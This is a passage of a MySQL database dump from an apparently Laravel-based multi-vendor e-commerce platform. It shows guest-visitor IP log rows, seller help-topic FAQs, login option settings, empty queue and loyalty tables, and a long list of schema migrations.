(1230,'94.23.7.187',NULL,'2025-07-11 04:09:37','2025-07-11 04:09:37'),
(1231,'94.23.7.187',NULL,'2025-07-11 04:09:39','2025-07-11 04:09:39'),
(1232,'94.23.7.187',NULL,'2025-07-11 04:09:42','2025-07-11 04:09:42'),
(1233,'94.23.7.187',NULL,'2025-07-11 04:09:44','2025-07-11 04:09:44'),
(1234,'94.23.7.187',NULL,'2025-07-11 04:09:47','2025-07-11 04:09:47'),
(1235,'94.23.7.187',NULL,'2025-07-11 04:09:49','2025-07-11 04:09:49'),
(1236,'94.23.7.187',NULL,'2025-07-11 04:09:52','2025-07-11 04:09:52'),
(1237,'94.23.7.187',NULL,'2025-07-11 04:09:55','2025-07-11 04:09:55'),
(1238,'94.23.7.187',NULL,'2025-07-11 04:09:58','2025-07-11 04:09:58'),
(1239,'94.23.7.187',NULL,'2025-07-11 04:10:00','2025-07-11 04:10:00'),
(1240,'94.23.7.187',NULL,'2025-07-11 04:10:03','2025-07-11 04:10:03'),
(1241,'94.23.7.187',NULL,'2025-07-11 04:10:05','2025-07-11 04:10:05'),
(1242,'94.23.7.187',NULL,'2025-07-11 04:10:09','2025-07-11 04:10:09'),
(1243,'94.23.7.187',NULL,'2025-07-11 04:10:12','2025-07-11 04:10:12'),
(1244,'94.23.7.187',NULL,'2025-07-11 04:10:14','2025-07-11 04:10:14'),
(1245,'94.23.7.187',NULL,'2025-07-11 04:10:17','2025-07-11 04:10:17'),
(1246,'94.23.7.187',NULL,'2025-07-11 04:10:20','2025-07-11 04:10:20'),
(1247,'94.23.7.187',NULL,'2025-07-11 04:10:22','2025-07-11 04:10:22'),
(1248,'94.23.7.187',NULL,'2025-07-11 04:10:24','2025-07-11 04:10:24'),
(1249,'94.23.7.187',NULL,'2025-07-11 04:10:27','2025-07-11 04:10:27'),
(1250,'94.23.7.187',NULL,'2025-07-11 04:10:29','2025-07-11 04:10:29'),
(1251,'94.23.7.187',NULL,'2025-07-11 04:10:32','2025-07-11 04:10:32'),
(1252,'94.23.7.187',NULL,'2025-07-11 04:10:34','2025-07-11 04:10:34'),
(1253,'94.23.7.187',NULL,'2025-07-11 04:10:36','2025-07-11 04:10:36'),
(1254,'94.23.7.187',NULL,'2025-07-11 04:10:39','2025-07-11 04:10:39'),
(1255,'94.23.7.187',NULL,'2025-07-11 04:10:41','2025-07-11 04:10:41'),
(1256,'94.23.7.187',NULL,'2025-07-11 04:10:44','2025-07-11 04:10:44'),
(1257,'94.23.7.187',NULL,'2025-07-11 04:10:50','2025-07-11 04:10:50'),
(1258,'94.23.7.187',NULL,'2025-07-11 04:10:53','2025-07-11 04:10:53'),
(1259,'94.23.7.187',NULL,'2025-07-11 04:10:55','2025-07-11 04:10:55'),
(1260,'147.135.128.96',NULL,'2025-07-11 05:29:49','2025-07-11 05:29:49'),
(1261,'147.135.128.96',NULL,'2025-07-11 05:29:52','2025-07-11 05:29:52'),
(1262,'147.135.128.96',NULL,'2025-07-11 05:29:54','2025-07-11 05:29:54'),
(1263,'147.135.128.96',NULL,'2025-07-11 05:30:04','2025-07-11 05:30:04'),
(1264,'147.135.128.96',NULL,'2025-07-11 05:30:06','2025-07-11 05:30:06'),
(1265,'147.135.128.96',NULL,'2025-07-11 05:30:09','2025-07-11 05:30:09'),
(1266,'66.249.70.201',NULL,'2025-07-11 05:59:50','2025-07-11 05:59:50'),
(1267,'64.227.99.210',NULL,'2025-07-11 07:31:40','2025-07-11 07:31:40'),
(1268,'107.174.224.18',NULL,'2025-07-11 09:09:51','2025-07-11 09:09:51'),
(1269,'198.55.98.200',NULL,'2025-07-11 10:44:52','2025-07-11 10:44:52'),
(1270,'66.249.70.201',NULL,'2025-07-11 11:46:02','2025-07-11 11:46:02'),
(1271,'66.249.70.193',NULL,'2025-07-11 11:59:10','2025-07-11 11:59:10'),
(1272,'66.249.70.192',NULL,'2025-07-11 13:50:36','2025-07-11 13:50:36'),
(1273,'66.249.70.193',NULL,'2025-07-11 14:31:57','2025-07-11 14:31:57'),
(1274,'213.230.80.124',NULL,'2025-07-11 15:18:16','2025-07-11 15:18:16'),
(1275,'5.133.192.189',NULL,'2025-07-11 15:35:17','2025-07-11 15:35:17'),
(1276,'66.249.70.192',NULL,'2025-07-11 15:47:03','2025-07-11 15:47:03'),
(1277,'66.249.70.192',NULL,'2025-07-11 16:42:35','2025-07-11 16:42:35'),
(1278,'66.249.70.201',NULL,'2025-07-11 17:44:35','2025-07-11 17:44:35'),
(1279,'66.249.70.192',NULL,'2025-07-11 18:53:36','2025-07-11 18:53:36'),
(1280,'66.249.70.192',NULL,'2025-07-11 20:23:34','2025-07-11 20:23:34'),
(1281,'213.230.82.152',NULL,'2025-07-11 22:42:56','2025-07-11 22:42:56'),
(1282,'20.115.49.110',NULL,'2025-07-11 22:43:12','2025-07-11 22:43:12'),
(1283,'192.178.6.97',NULL,'2025-07-11 23:23:36','2025-07-11 23:23:36'),
(1284,'192.178.6.105',NULL,'2025-07-12 01:45:15','2025-07-12 01:45:15'),
(1285,'192.178.6.96',NULL,'2025-07-12 02:23:35','2025-07-12 02:23:35'),
(1286,'192.178.6.105',NULL,'2025-07-12 03:12:43','2025-07-12 03:12:43'),
(1287,'3.251.64.116',NULL,'2025-07-12 03:27:31','2025-07-12 03:27:31'),
(1288,'192.178.6.97',NULL,'2025-07-12 03:53:35','2025-07-12 03:53:35'),
(1289,'192.178.6.96',NULL,'2025-07-12 07:50:56','2025-07-12 07:50:56'),
(1290,'192.178.6.105',NULL,'2025-07-12 08:04:11','2025-07-12 08:04:11'),
(1291,'192.178.6.97',NULL,'2025-07-12 08:16:11','2025-07-12 08:16:11'),
(1292,'192.178.6.105',NULL,'2025-07-12 09:09:41','2025-07-12 09:09:41'),
(1293,'23.22.189.19',NULL,'2025-07-12 11:17:54','2025-07-12 11:17:54'),
(1294,'192.178.6.105',NULL,'2025-07-12 13:35:13','2025-07-12 13:35:13'),
(1295,'34.73.154.111',NULL,'2025-07-12 13:53:17','2025-07-12 13:53:17'),
(1296,'34.73.154.111',NULL,'2025-07-12 13:53:17','2025-07-12 13:53:17'),
(1297,'192.178.6.97',NULL,'2025-07-12 14:21:08','2025-07-12 14:21:08'),
(1298,'192.178.6.96',NULL,'2025-07-12 15:22:08','2025-07-12 15:22:08'),
(1299,'192.178.6.96',NULL,'2025-07-12 18:17:15','2025-07-12 18:17:15'),
(1300,'192.178.6.96',NULL,'2025-07-12 19:22:08','2025-07-12 19:22:08'),
(1301,'192.178.6.96',NULL,'2025-07-12 20:22:09','2025-07-12 20:22:09'),
(1302,'213.230.82.176',NULL,'2025-07-12 20:23:29','2025-07-12 20:23:29'),
(1303,'172.104.129.194',NULL,'2025-07-12 21:00:07','2025-07-12 21:00:07'),
(1304,'172.104.129.194',NULL,'2025-07-12 21:00:08','2025-07-12 21:00:08'),
(1305,'66.249.70.193',NULL,'2025-07-12 21:47:15','2025-07-12 21:47:15'),
(1306,'66.249.70.201',NULL,'2025-07-12 22:17:15','2025-07-12 22:17:15'),
(1307,'66.249.70.193',NULL,'2025-07-12 22:48:15','2025-07-12 22:48:15'),
(1308,'139.59.225.177',NULL,'2025-07-13 01:21:04','2025-07-13 01:21:04'),
(1309,'66.249.70.193',NULL,'2025-07-13 01:46:17','2025-07-13 01:46:17'),
(1310,'66.249.70.192',NULL,'2025-07-13 02:32:17','2025-07-13 02:32:17'),
(1311,'192.175.111.243',NULL,'2025-07-13 06:54:59','2025-07-13 06:54:59'),
(1312,'192.175.111.249',NULL,'2025-07-13 06:55:02','2025-07-13 06:55:02'),
(1313,'64.15.129.101',NULL,'2025-07-13 06:55:08','2025-07-13 06:55:08'),
(1314,'192.175.111.252',NULL,'2025-07-13 06:55:15','2025-07-13 06:55:15'),
(1315,'3.95.66.173',NULL,'2025-07-13 08:48:48','2025-07-13 08:48:48'),
(1316,'66.249.70.193',NULL,'2025-07-13 11:25:48','2025-07-13 11:25:48'),
(1317,'94.247.172.129',NULL,'2025-07-13 11:49:53','2025-07-13 11:49:53'),
(1318,'66.249.70.201',NULL,'2025-07-13 11:51:08','2025-07-13 11:51:08'),
(1319,'66.249.70.192',NULL,'2025-07-13 12:16:19','2025-07-13 12:16:19'),
(1320,'66.249.70.201',NULL,'2025-07-13 12:31:19','2025-07-13 12:31:19');
/*!40000 ALTER TABLE `guest_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `help_topics`
--

DROP TABLE IF EXISTS `help_topics`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `help_topics` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `type` varchar(191) NOT NULL DEFAULT 'default',
  `question` text DEFAULT NULL,
  `answer` text DEFAULT NULL,
  `ranking` int(11) NOT NULL DEFAULT 1,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `help_topics`
--

LOCK TABLES `help_topics` WRITE;
/*!40000 ALTER TABLE `help_topics` DISABLE KEYS */;
INSERT INTO `help_topics` VALUES
(1,'vendor_registration','How do I register as a seller?','To register, click on the \"Sign Up\" button, fill in your details, and verify your account via email.',1,1,NULL,NULL),
(2,'vendor_registration','What are the fees for selling?','Our platform charges a small commission on each sale. There are no upfront listing fees.',2,1,NULL,NULL),
(3,'vendor_registration','How do I upload products?','Log in to your seller account, go to the \"Upload Products\" section, and fill in the product details and images.',3,1,NULL,NULL),
(4,'vendor_registration','How do I handle customer inquiries?','You can manage customer inquiries directly through our platform\'s messaging system, ensuring quick and efficient communication.',4,1,NULL,NULL),
(5,'vendor_registration','How do I register as a seller?','To register, click on the \"Sign Up\" button, fill in your details, and verify your account via email.',1,1,NULL,NULL),
(6,'vendor_registration','What are the fees for selling?','Our platform charges a small commission on each sale. There are no upfront listing fees.',2,1,NULL,NULL),
(7,'vendor_registration','How do I upload products?','Log in to your seller account, go to the \"Upload Products\" section, and fill in the product details and images.',3,1,NULL,NULL),
(8,'vendor_registration','How do I handle customer inquiries?','You can manage customer inquiries directly through our platform\'s messaging system, ensuring quick and efficient communication.',4,1,NULL,NULL);
/*!40000 ALTER TABLE `help_topics` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jobs`
--

DROP TABLE IF EXISTS `jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jobs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `queue` varchar(191) NOT NULL,
  `payload` longtext NOT NULL,
  `attempts` tinyint(3) unsigned NOT NULL,
  `reserved_at` int(10) unsigned DEFAULT NULL,
  `available_at` int(10) unsigned NOT NULL,
  `created_at` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `jobs_queue_index` (`queue`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jobs`
--

LOCK TABLES `jobs` WRITE;
/*!40000 ALTER TABLE `jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `jobs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `login_setups`
--

DROP TABLE IF EXISTS `login_setups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `login_setups` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `key` varchar(255) DEFAULT NULL,
  `value` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login_setups`
--

LOCK TABLES `login_setups` WRITE;
/*!40000 ALTER TABLE `login_setups` DISABLE KEYS */;
INSERT INTO `login_setups` VALUES
(1,'login_options','{\"manual_login\":1,\"otp_login\":0,\"social_login\":1}','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(2,'social_media_for_login','{\"google\":1,\"facebook\":1,\"apple\":1}','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(3,'email_verification','0','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(4,'phone_verification','0','2024-09-24 07:52:17','2024-09-24 07:52:17');
/*!40000 ALTER TABLE `login_setups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `loyalty_point_transactions`
--

DROP TABLE IF EXISTS `loyalty_point_transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `loyalty_point_transactions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) unsigned DEFAULT NULL,
  `transaction_id` char(36) NOT NULL,
  `credit` decimal(24,3) NOT NULL DEFAULT 0.000,
  `debit` decimal(24,3) NOT NULL DEFAULT 0.000,
  `balance` decimal(24,3) NOT NULL DEFAULT 0.000,
  `reference` varchar(191) DEFAULT NULL,
  `transaction_type` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `loyalty_point_transactions`
--

LOCK TABLES `loyalty_point_transactions` WRITE;
/*!40000 ALTER TABLE `loyalty_point_transactions` DISABLE KEYS */;
/*!40000 ALTER TABLE `loyalty_point_transactions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `migrations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(191) NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=299 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES
(1,'2014_10_12_000000_create_users_table',1),
(2,'2014_10_12_100000_create_password_resets_table',1),
(3,'2019_08_19_000000_create_failed_jobs_table',1),
(4,'2020_09_08_105159_create_admins_table',1),
(5,'2020_09_08_111837_create_admin_roles_table',1),
(6,'2020_09_16_142451_create_categories_table',2),
(7,'2020_09_16_181753_create_categories_table',3),
(8,'2020_09_17_134238_create_brands_table',4),
(9,'2020_09_17_203054_create_attributes_table',5),
(10,'2020_09_19_112509_create_coupons_table',6),
(11,'2020_09_19_161802_create_curriencies_table',7),
(12,'2020_09_20_114509_create_sellers_table',8),
(13,'2020_09_23_113454_create_shops_table',9),
(14,'2020_09_23_115615_create_shops_table',10),
(15,'2020_09_23_153822_create_shops_table',11),
(16,'2020_09_21_122817_create_products_table',12),
(17,'2020_09_22_140800_create_colors_table',12),
(18,'2020_09_28_175020_create_products_table',13),
(19,'2020_09_28_180311_create_products_table',14),
(20,'2020_10_04_105041_create_search_functions_table',15),
(21,'2020_10_05_150730_create_customers_table',15),
(22,'2020_10_08_133548_create_wishlists_table',16),
(23,'2016_06_01_000001_create_oauth_auth_codes_table',17),
(24,'2016_06_01_000002_create_oauth_access_tokens_table',17),
(25,'2016_06_01_000003_create_oauth_refresh_tokens_table',17),
(26,'2016_06_01_000004_create_oauth_clients_table',17),
(27,'2016_06_01_000005_create_oauth_personal_access_clients_table',17),
(28,'2020_10_06_133710_create_product_stocks_table',17),
(29,'2020_10_06_134636_create_flash_deals_table',17),
(30,'2020_10_06_134719_create_flash_deal_products_table',17),
(31,'2020_10_08_115439_create_orders_table',17),
(32,'2020_10_08_115453_create_order_details_table',17),
(33,'2020_10_08_121135_create_shipping_addresses_table',17),
(34,'2020_10_10_171722_create_business_settings_table',17),
(35,'2020_09_19_161802_create_currencies_table',18),
(36,'2020_10_12_152350_create_reviews_table',18),
(37,'2020_10_12_161834_create_reviews_table',19),
(38,'2020_10_12_180510_create_support_tickets_table',20),
(39,'2020_10_14_140130_create_transactions_table',21),
(40,'2020_10_14_143553_create_customer_wallets_table',21),
(41,'2020_10_14_143607_create_customer_wallet_histories_table',21),
(42,'2020_10_22_142212_create_support_ticket_convs_table',21),
(43,'2020_10_24_234813_create_banners_table',22),
(44,'2020_10_27_111557_create_shipping_methods_table',23),
(45,'2020_10_27_114154_add_url_to_banners_table',24),
(46,'2020_10_28_170308_add_shipping_id_to_order_details',25),
(47,'2020_11_02_140528_add_discount_to_order_table',26),
(48,'2020_11_03_162723_add_column_to_order_details',27),
(49,'2020_11_08_202351_add_url_to_banners_table',28),
(50,'2020_11_10_112713_create_help_topic',29),
(51,'2020_11_10_141513_create_contacts_table',29),
(52,'2020_11_15_180036_add_address_column_user_table',30),
(53,'2020_11_18_170209_add_status_column_to_product_table',31),
(54,'2020_11_19_115453_add_featured_status_product',32),
(55,'2020_11_21_133302_create_deal_of_the_days_table',33),
(56,'2020_11_20_172332_add_product_id_to_products',34),
(57,'2020_11_27_234439_add__state_to_shipping_addresses',34),
(58,'2020_11_28_091929_create_chattings_table',35),
(59,'2020_12_02_011815_add_bank_info_to_sellers',36),
(60,'2020_12_08_193234_create_social_medias_table',37),
(61,'2020_12_13_122649_shop_id_to_chattings',37),
(62,'2020_12_14_145116_create_seller_wallet_histories_table',38),
(63,'2020_12_14_145127_create_seller_wallets_table',38),
(64,'2020_12_15_174804_create_admin_wallets_table',39),
(65,'2020_12_15_174821_create_admin_wallet_histories_table',39),
(66,'2020_12_15_214312_create_feature_deals_table',40),
(67,'2020_12_17_205712_create_withdraw_requests_table',41),
(68,'2021_02_22_161510_create_notifications_table',42),
(69,'2021_02_24_154706_add_deal_type_to_flash_deals',43),
(70,'2021_03_03_204349_add_cm_firebase_token_to_users',44),
(71,'2021_04_17_134848_add_column_to_order_details_stock',45),
(72,'2021_05_12_155401_add_auth_token_seller',46),
(73,'2021_06_03_104531_ex_rate_update',47),
(74,'2021_06_03_222413_amount_withdraw_req',48),
(75,'2021_06_04_154501_seller_wallet_withdraw_bal',49),
(76,'2021_06_04_195853_product_dis_tax',50),
(77,'2021_05_27_103505_create_product_translations_table',51),
(78,'2021_06_17_054551_create_soft_credentials_table',51),
(79,'2021_06_29_212549_add_active_col_user_table',52),
(80,'2021_06_30_212619_add_col_to_contact',53),
(81,'2021_07_01_160828_add_col_daily_needs_products',54),
(82,'2021_07_04_182331_add_col_seller_sales_commission',55),
(83,'2021_08_07_190655_add_seo_columns_to_products',56),
(84,'2021_08_07_205913_add_col_to_category_table',56),
(85,'2021_08_07_210808_add_col_to_shops_table',56),
(86,'2021_08_14_205216_change_product_price_col_type',56),
(87,'2021_08_16_201505_change_order_price_col',56),
(88,'2021_08_16_201552_change_order_details_price_col',56),
(89,'2019_09_29_154000_create_payment_cards_table',57),
(90,'2021_08_17_213934_change_col_type_seller_earning_history',57),
(91,'2021_08_17_214109_change_col_type_admin_earning_history',57),
(92,'2021_08_17_214232_change_col_type_admin_wallet',57),
(93,'2021_08_17_214405_change_col_type_seller_wallet',57),
(94,'2021_08_22_184834_add_publish_to_products_table',57),
(95,'2021_09_08_211832_add_social_column_to_users_table',57),
(96,'2021_09_13_165535_add_col_to_user',57),
(97,'2021_09_19_061647_add_limit_to_coupons_table',57),
(98,'2021_09_20_020716_add_coupon_code_to_orders_table',57),
(99,'2021_09_23_003059_add_gst_to_sellers_table',57),
(100,'2021_09_28_025411_create_order_transactions_table',57),
(101,'2021_10_02_185124_create_carts_table',57),
(102,'2021_10_02_190207_create_cart_shippings_table',57),
(103,'2021_10_03_194334_add_col_order_table',57),
(104,'2021_10_03_200536_add_shipping_cost',57),
(105,'2021_10_04_153201_add_col_to_order_table',57),
(106,'2021_10_07_172701_add_col_cart_shop_info',57),
(107,'2021_10_07_184442_create_phone_or_email_verifications_table',57),
(108,'2021_10_07_185416_add_user_table_email_verified',57),
(109,'2021_10_11_192739_add_transaction_amount_table',57),
(110,'2021_10_11_200850_add_order_verification_code',57),
(111,'2021_10_12_083241_add_col_to_order_transaction',57),
(112,'2021_10_12_084440_add_seller_id_to_order',57),
(113,'2021_10_12_102853_change_col_type',57),
(114,'2021_10_12_110434_add_col_to_admin_wallet',57),
(115,'2021_10_12_110829_add_col_to_seller_wallet',57),
(116,'2021_10_13_091801_add_col_to_admin_wallets',57),
(117,'2021_10_13_092000_add_col_to_seller_wallets_tax',57),
(118,'2021_10_13_165947_rename_and_remove_col_seller_wallet',57),
(119,'2021_10_13_170258_rename_and_remove_col_admin_wallet',57),
(120,'2021_10_14_061603_column_update_order_transaction',57),
(121,'2021_10_15_103339_remove_col_from_seller_wallet',57),
(122,'2021_10_15_104419_add_id_col_order_tran',57),
(123,'2021_10_15_213454_update_string_limit',57),
(124,'2021_10_16_234037_change_col_type_translation',57),
(125,'2021_10_16_234329_change_col_type_translation_1',57),
(126,'2021_10_27_091250_add_shipping_address_in_order',58),
(127,'2021_01_24_205114_create_paytabs_invoices_table',59),
(128,'2021_11_20_043814_change_pass_reset_email_col',59),
(129,'2021_11_25_043109_create_delivery_men_table',60),
(130,'2021_11_25_062242_add_auth_token_delivery_man',60),
(131,'2021_11_27_043405_add_deliveryman_in_order_table',60),
(132,'2021_11_27_051432_create_delivery_histories_table',60),
(133,'2021_11_27_051512_add_fcm_col_for_delivery_man',60),
(134,'2021_12_15_123216_add_columns_to_banner',60),
(135,'2022_01_04_100543_add_order_note_to_orders_table',60),
(136,'2022_01_10_034952_add_lat_long_to_shipping_addresses_table',60),
(137,'2022_01_10_045517_create_billing_addresses_table',60),
(138,'2022_01_11_040755_add_is_billing_to_shipping_addresses_table',60),
(139,'2022_01_11_053404_add_billing_to_orders_table',60),
(140,'2022_01_11_234310_add_firebase_toke_to_sellers_table',60),
(141,'2022_01_16_121801_change_colu_type',60),
(142,'2022_01_22_101601_change_cart_col_type',61),
(143,'2022_01_23_031359_add_column_to_orders_table',61),
(144,'2022_01_28_235054_add_status_to_admins_table',61),
(145,'2022_02_01_214654_add_pos_status_to_sellers_table',61),
(146,'2019_12_14_000001_create_personal_access_tokens_table',62),
(147,'2022_02_11_225355_add_checked_to_orders_table',62),
(148,'2022_02_14_114359_create_refund_requests_table',62),
(149,'2022_02_14_115757_add_refund_request_to_order_details_table',62),
(150,'2022_02_15_092604_add_order_details_id_to_transactions_table',62),
(151,'2022_02_15_121410_create_refund_transactions_table',62),
(152,'2022_02_24_091236_add_multiple_column_to_refund_requests_table',62),
(153,'2022_02_24_103827_create_refund_statuses_table',62),
(154,'2022_03_01_121420_add_refund_id_to_refund_transactions_table',62),
(155,'2022_03_10_091943_add_priority_to_categories_table',63),
(156,'2022_03_13_111914_create_shipping_types_table',63),
(157,'2022_03_13_121514_create_category_shipping_costs_table',63),
(158,'2022_03_14_074413_add_four_column_to_products_table',63),
(159,'2022_03_15_105838_add_shipping_to_carts_table',63),
(160,'2022_03_16_070327_add_shipping_type_to_orders_table',63),
(161,'2022_03_17_070200_add_delivery_info_to_orders_table',63),
(162,'2022_03_18_143339_add_shipping_type_to_carts_table',63),
(163,'2022_04_06_020313_create_subscriptions_table',64),
(164,'2022_04_12_233704_change_column_to_products_table',64),
(165,'2022_04_19_095926_create_jobs_table',64),
(166,'2022_05_12_104247_create_wallet_transactions_table',65),
(167,'2022_05_12_104511_add_two_column_to_users_table',65),
(168,'2022_05_14_063309_create_loyalty_point_transactions_table',65),
(169,'2022_05_26_044016_add_user_type_to_password_resets_table',65),
(170,'2022_04_15_235820_add_provider',66),
(171,'2022_07_21_101659_add_code_to_products_table',66),
(172,'2022_07_26_103744_add_notification_count_to_notifications_table',66),
(173,'2022_07_31_031541_add_minimum_order_qty_to_products_table',66),
(174,'2022_08_11_172839_add_product_type_and_digital_product_type_and_digital_file_ready_to_products',67),
(175,'2022_08_11_173941_add_product_type_and_digital_product_type_and_digital_file_to_order_details',67),
(176,'2022_08_20_094225_add_product_type_and_digital_product_type_and_digital_file_ready_to_carts_table',67),
(177,'2022_10_04_160234_add_banking_columns_to_delivery_men_table',68),
(178,'2022_10_04_161339_create_deliveryman_wallets_table',68),
(179,'2022_10_04_184506_add_deliverymanid_column_to_withdraw_requests_table',68),
(180,'2022_10_11_103011_add_deliverymans_columns_to_chattings_table',68),
(181,'2022_10_11_144902_add_deliverman_id_cloumn_to_reviews_table',68),
(182,'2022_10_17_114744_create_order_status_histories_table',68),
(183,'2022_10_17_120840_create_order_expected_delivery_histories_table',68),
(184,'2022_10_18_084245_add_deliveryman_charge_and_expected_delivery_date',68),
(185,'2022_10_18_130938_create_delivery_zip_codes_table',68),
(186,'2022_10_18_130956_create_delivery_country_codes_table',68),
(187,'2022_10_20_164712_create_delivery_man_transactions_table',68),
(188,'2022_10_27_145604_create_emergency_contacts_table',68),
(189,'2022_10_29_182930_add_is_pause_cause_to_orders_table',68),
(190,'2022_10_31_150604_add_address_phone_country_code_column_to_delivery_men_table',68),
(191,'2022_11_05_185726_add_order_id_to_reviews_table',68),
(192,'2022_11_07_190749_create_deliveryman_notifications_table',68),
(193,'2022_11_08_132745_change_transaction_note_type_to_withdraw_requests_table',68),
(194,'2022_11_10_193747_chenge_order_amount_seller_amount_admin_commission_delivery_charge_tax_toorder_transactions_table',68),
(195,'2022_12_17_035723_few_field_add_to_coupons_table',69),
(196,'2022_12_26_231606_add_coupon_discount_bearer_and_admin_commission_to_orders',69),
(197,'2023_01_04_003034_alter_billing_addresses_change_zip',69),
(198,'2023_01_05_121600_change_id_to_transactions_table',69),
(199,'2023_02_02_113330_create_product_tag_table',70),
(200,'2023_02_02_114518_create_tags_table',70),
(201,'2023_02_02_152248_add_tax_model_to_products_table',70),
(202,'2023_02_02_152718_add_tax_model_to_order_details_table',70),
(203,'2023_02_02_171034_add_tax_type_to_carts',70),
(204,'2023_02_06_124447_add_color_image_column_to_products_table',70),
(205,'2023_02_07_120136_create_withdrawal_methods_table',70),
(206,'2023_02_07_175939_add_withdrawal_method_id_and_withdrawal_method_fields_to_withdraw_requests_table',70),
(207,'2023_02_08_143314_add_vacation_start_and_vacation_end_and_vacation_not_column_to_shops_table',70),
(208,'2023_02_09_104656_add_payment_by_and_payment_not_to_orders_table',70),
(209,'2023_03_27_150723_add_expires_at_to_phone_or_email_verifications',71),
(210,'2023_04_17_095721_create_shop_followers_table',71),
(211,'2023_04_17_111249_add_bottom_banner_to_shops_table',71),
(212,'2023_04_20_125423_create_product_compares_table',71),
(213,'2023_04_30_165642_add_category_sub_category_and_sub_sub_category_add_in_product_table',71),
(214,'2023_05_16_131006_add_expires_at_to_password_resets',71),
(215,'2023_05_17_044243_add_visit_count_to_tags_table',71),
(216,'2023_05_18_000403_add_title_and_subtitle_and_background_color_and_button_text_to_banners_table',71),
(217,'2023_05_21_111300_add_login_hit_count_and_is_temp_blocked_and_temp_block_time_to_users_table',71),
(218,'2023_05_21_111600_add_login_hit_count_and_is_temp_blocked_and_temp_block_time_to_phone_or_email_verifications_table',71),
(219,'2023_05_21_112215_add_login_hit_count_and_is_temp_blocked_and_temp_block_time_to_password_resets_table',71),
(220,'2023_06_04_210726_attachment_lenght_change_to_reviews_table',71),
(221,'2023_06_05_115153_add_referral_code_and_referred_by_to_users_table',72),
(222,'2023_06_21_002658_add_offer_banner_to_shops_table',72),
(223,'2023_07_08_210747_create_most_demandeds_table',72),
(224,'2023_07_31_111419_add_minimum_order_amount_to_sellers_table',72),
(225,'2023_08_03_105256_create_offline_payment_methods_table',72),
(226,'2023_08_07_131013_add_is_guest_column_to_carts_table',72),
(227,'2023_08_07_170601_create_offline_payments_table',72),
(228,'2023_08_12_102355_create_add_fund_bonus_categories_table',72),
(229,'2023_08_12_215346_create_guest_users_table',72),
(230,'2023_08_12_215659_add_is_guest_column_to_orders_table',72),
(231,'2023_08_12_215933_add_is_guest_column_to_shipping_addresses_table',72),
(232,'2023_08_15_000957_add_email_column_toshipping_address_table',72),
(233,'2023_08_17_222330_add_identify_related_columns_to_admins_table',72),
(234,'2023_08_20_230624_add_sent_by_and_send_to_in_notifications_table',72),
(235,'2023_08_20_230911_create_notification_seens_table',72),
(236,'2023_08_21_042331_add_theme_to_banners_table',72),
(237,'2023_08_24_150009_add_free_delivery_over_amount_and_status_to_seller_table',72),
(238,'2023_08_26_161214_add_is_shipping_free_to_orders_table',72),
(239,'2023_08_26_173523_add_payment_method_column_to_wallet_transactions_table',72),
(240,'2023_08_26_204653_add_verification_status_column_to_orders_table',72),
(241,'2023_08_26_225113_create_order_delivery_verifications_table',72),
(242,'2023_09_03_212200_add_free_delivery_responsibility_column_to_orders_table',72),
(243,'2023_09_23_153314_add_shipping_responsibility_column_to_orders_table',72),
(244,'2023_09_25_152733_create_digital_product_otp_verifications_table',72),
(245,'2023_09_27_191638_add_attachment_column_to_support_ticket_convs_table',73),
(246,'2023_10_01_205117_add_attachment_column_to_chattings_table',73),
(247,'2023_10_07_182714_create_notification_messages_table',73),
